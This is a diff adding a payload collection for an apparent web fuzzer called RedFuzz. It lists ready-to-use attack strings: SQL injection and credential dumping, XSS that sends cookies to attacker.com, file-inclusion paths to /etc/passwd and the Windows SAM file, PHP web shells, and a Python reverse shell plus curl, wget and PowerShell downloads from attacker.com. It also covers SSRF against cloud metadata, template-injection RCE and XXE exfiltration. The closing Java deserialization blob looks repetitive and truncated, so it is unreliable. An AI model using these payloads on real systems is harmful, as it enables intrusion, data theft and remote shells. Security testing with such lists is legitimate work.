@@ -1,0 +1,351 @@
+# RedFuzz v5.0.0 - Comprehensive Payload Collection
+# Author: 0xRedHood (https://github.com/0xRedHood)
+# This file contains all payloads for various attack vectors
+
+# =============================================================================
+# SQL INJECTION PAYLOADS
+# =============================================================================
+
+# Basic SQL Injection
+' OR '1'='1
+' OR 1=1--
+'; DROP TABLE users--
+' UNION SELECT NULL--
+admin'--
+1' OR '1'='1'--
+' OR 1=1#
+' OR 1=1/*
+' OR '1'='1' OR '1'='1
+' OR 1=1 LIMIT 1--
+' OR 1=1 ORDER BY 1--
+' OR 1=1 GROUP BY 1--
+
+# Advanced SQL Injection
+' UNION SELECT username,password FROM users--
+' UNION SELECT @@version--
+' UNION SELECT database()--
+' UNION SELECT user()--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+' UNION SELECT CONCAT(username,':',password) FROM users--
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' UNION SELECT UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
+
+# Boolean-based SQL Injection
+' AND 1=1--
+' AND 1=2--
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND (SELECT LENGTH(username) FROM users LIMIT 1)>0--
+' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1)>0--
+
+# Time-based SQL Injection
+'; WAITFOR DELAY '00:00:05'--
+'; SLEEP(5)--
+'; pg_sleep(5)--
+'; SELECT SLEEP(5)--
+'; BENCHMARK(5000000,MD5(1))--
+
+# Error-based SQL Injection
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+# =============================================================================
+# XSS (CROSS-SITE SCRIPTING) PAYLOADS
+# =============================================================================
+
+# Basic XSS
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+javascript:alert('XSS')
+<svg onload=alert('XSS')>
+'><script>alert('XSS')</script>
+<iframe src=javascript:alert('XSS')>
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+
+# Advanced XSS
+<script>fetch('http://attacker.com?cookie='+document.cookie)</script>
+<img src=x onerror="fetch('http://attacker.com?cookie='+document.cookie)">
+<svg onload="fetch('http://attacker.com?cookie='+document.cookie)">
+<script>new Image().src="http://attacker.com?cookie="+document.cookie;</script>
+<script>document.location="http://attacker.com?cookie="+document.cookie;</script>
+
+# Filter Bypass XSS
+<ScRiPt>alert('XSS')</ScRiPt>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>eval('ale'+'rt(\"XSS\")')</script>
+<script>setTimeout('alert(\"XSS\")',1000)</script>
+<img src="javascript:alert('XSS')">
+<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ1hTUycpPjwvc3ZnPg==">
+
+# DOM XSS
+javascript:alert(document.cookie)
+javascript:alert(location.href)
+javascript:alert(location.search)
+javascript:alert(location.hash)
+
+# =============================================================================
+# LFI (LOCAL FILE INCLUSION) PAYLOADS
+# =============================================================================
+
+# Unix/Linux Systems
+../../../etc/passwd
+/etc/passwd
+....//....//....//etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+../../../etc/hosts
+/etc/hosts
+../../../etc/shadow
+/proc/version
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/fd/0
+/proc/self/status
+/proc/net/tcp
+/proc/net/udp
+
+# Windows Systems
+..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+c:\\windows\\system32\\drivers\\etc\\hosts
+..\\..\\..\\windows\\system32\\config\\sam
+c:\\windows\\system32\\config\\sam
+..\\..\\..\\windows\\win.ini
+c:\\windows\\win.ini
+..\\..\\..\\windows\\system.ini
+c:\\windows\\system.ini
+..\\..\\..\\windows\\repair\\sam
+c:\\windows\\repair\\sam
+
+# PHP Specific
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=config.php
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+
+php://input
+php://filter/convert.base64-encode/resource=../../../etc/passwd
+
+# Null Byte Injection
+../../../etc/passwd%00
+/etc/passwd%00
+..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00
+c:\\windows\\system32\\drivers\\etc\\hosts%00
+
+# =============================================================================
+# RFI (REMOTE FILE INCLUSION) PAYLOADS
+# =============================================================================
+
+# HTTP/HTTPS
+http://evil.com/shell.txt
+https://attacker.com/backdoor.php
+http://attacker.com/shell.php
+https://evil.com/payload.txt
+
+# FTP
+ftp://evil.com/shell.txt
+ftp://attacker.com/backdoor.php
+
+# Data URI
+data://text/plain,<?php system($_GET['cmd']); ?>
+data://text/plain,<?php echo shell_exec($_GET['cmd']); ?>
+data://text/plain,<?php passthru($_GET['cmd']); ?>
+
+# PHP Wrappers
+php://input
+expect://id
+file:///etc/passwd
+file://c:\\windows\\system32\\drivers\\etc\\hosts
+
+# =============================================================================
+# COMMAND INJECTION PAYLOADS
+# =============================================================================
+
+# Unix/Linux Commands
+; ls -la
+| whoami
+`id`
+$(whoami)
+; cat /etc/passwd
+| netstat -an
+; uname -a
+| ps aux
+; find / -name '*.txt'
+| wget http://attacker.com/shell
+; curl http://attacker.com/shell
+| nc -l -p 4444
+; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
+
+# Windows Commands
+& dir
+| whoami
+; dir
+& type C:\\windows\\system32\\drivers\\etc\\hosts
+| net user
+; systeminfo
+& ipconfig
+| tasklist
+; netstat -an
+& net user administrator
+| wmic process list
+; powershell -Command "Invoke-WebRequest -Uri http://attacker.com/shell -OutFile shell.exe"
+
+# Advanced Commands
+; ping -c 1 attacker.com
+| nslookup attacker.com
+; curl http://attacker.com
+| wget -qO- http://attacker.com
+; dig attacker.com
+| host attacker.com
+
+# =============================================================================
+# HEADER INJECTION PAYLOADS
+# =============================================================================
+
+# User-Agent
+Mozilla/5.0 (compatible; RedFuzz/5.0.0)
+<script>alert('XSS')</script>
+' OR '1'='1
+' UNION SELECT NULL--
+javascript:alert('XSS')
+'><script>alert('XSS')</script>
+
+# Referer
+http://attacker.com
+javascript:alert('XSS')
+' UNION SELECT NULL--
+' OR '1'='1
+'><script>alert('XSS')</script>
+
+# X-Forwarded-For
+127.0.0.1
+192.168.1.1
+' OR '1'='1
+<script>alert('XSS')</script>
+' UNION SELECT NULL--
+
+# X-Real-IP
+127.0.0.1
+192.168.1.1
+admin'--
+' OR '1'='1
+<script>alert('XSS')</script>
+
+# Host
+attacker.com
+evil.com
+' OR '1'='1
+<script>alert('XSS')</script>
+
+# =============================================================================
+# OPEN REDIRECT PAYLOADS
+# =============================================================================
+
+# Basic Redirects
+http://attacker.com
+https://evil.com
+//attacker.com
+javascript:alert('XSS')
+data:text/html,<script>alert('XSS')</script>
+
+# Advanced Redirects
+http://attacker.com?cookie=document.cookie
+https://evil.com?data=location.href
+//attacker.com?param=location.search
+
+# =============================================================================
+# SSRF (SERVER-SIDE REQUEST FORGERY) PAYLOADS
+# =============================================================================
+
+# Internal Services
+http://127.0.0.1:80
+http://localhost:80
+http://0.0.0.0:80
+http://127.0.0.1:22
+http://localhost:22
+http://127.0.0.1:3306
+http://localhost:3306
+http://127.0.0.1:5432
+http://localhost:5432
+
+# Cloud Metadata
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/dynamic/instance-identity/
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/metadata/v1/
+
+# =============================================================================
+# AUTHENTICATION BYPASS PAYLOADS
+# =============================================================================
+
+# SQL Injection in Auth
+admin'--
+admin' OR '1'='1'--
+admin' OR 1=1--
+admin' OR 1=1#
+admin' OR 1=1/*
+' OR '1'='1
+' OR 1=1--
+
+# Weak Authentication
+admin:admin
+admin:password
+admin:123456
+admin:admin123
+admin:password123
+admin:root
+admin:toor
+
+# =============================================================================
+# JSONP CALLBACK PAYLOADS
+# =============================================================================
+
+# XSS in Callback
+<script>alert('XSS')</script>
+javascript:alert('XSS')
+'><script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+
+# =============================================================================
+# TEMPLATE INJECTION PAYLOADS
+# =============================================================================
+
+# Basic Template Injection
+{{7*7}}
+{{config}}
+{{request}}
+{{settings}}
+{{self}}
+{{url_for.__globals__}}
+
+# Advanced Template Injection
+{{config.items()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+
+# =============================================================================
+# XXE (XML EXTERNAL ENTITY) PAYLOADS
+# =============================================================================
+
+# Basic XXE
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<test>&xxe;</test>
+
+# Advanced XXE
+<!DOCTYPE data [
+<!ENTITY file SYSTEM "file:///etc/passwd">
+<!ENTITY eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%file;'>">
+]>
+<data>&eval;&exfil;</data>
+
+# =============================================================================
+# DESERIALIZATION PAYLOADS
+# =============================================================================
+
+# PHP Object Injection
+O:4:"User":2:{s:4:"name":s:6:"hacker";s:3:"id":i:1;}
+
+# Java Deserialization
+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 
